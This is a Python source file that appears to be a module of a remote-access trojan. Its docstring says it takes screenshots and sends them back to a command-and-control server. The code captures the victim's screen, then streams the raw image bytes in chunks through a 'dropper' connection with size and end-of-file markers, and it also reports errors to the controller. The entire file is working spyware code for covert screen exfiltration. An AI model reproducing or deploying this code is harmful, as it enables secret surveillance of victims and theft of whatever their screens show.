import os
import time
import pyscreenshot, PIL

from gzip import compress as gzipup
from base64 import b64encode

def main(dropper, args=None):
    """Take screenshots and send back to C2"""
    
    print("DEBUG - taking screenshot.")
    #Get screenshot
    try:
        img = pyscreenshot.grab(childprocess=False)
        print("DEBUG - Got screenshot")

        #Prep for sending
        data = img.tobytes()
        #data = b64encode(data)
        #data = gzipup(data)
        print("DEBUG - img data size : {}".format(len(data)))
        i = 0
        packet = ('BSFSIZE ' + str(img.size[0]) + ',' + str(img.size[1])).encode()

        while len(packet) > 0:
            dropper.send(packet) #.decode()
            #time.sleep(0.001)   #Avoid messages stacking up
            packet = data[i*1024:i*1024+1024]
            i +=1

        dropper.send(' <BSEOF>')
    except Exception as e:
        print("DEBUG - Couldn't complete screenshot because : {}.".format(e))
        dropper.send('ERROR - Couldn\'t screenshot : {}'.format(e))
    finally:
        try:
            img.close()
        except:
            pass
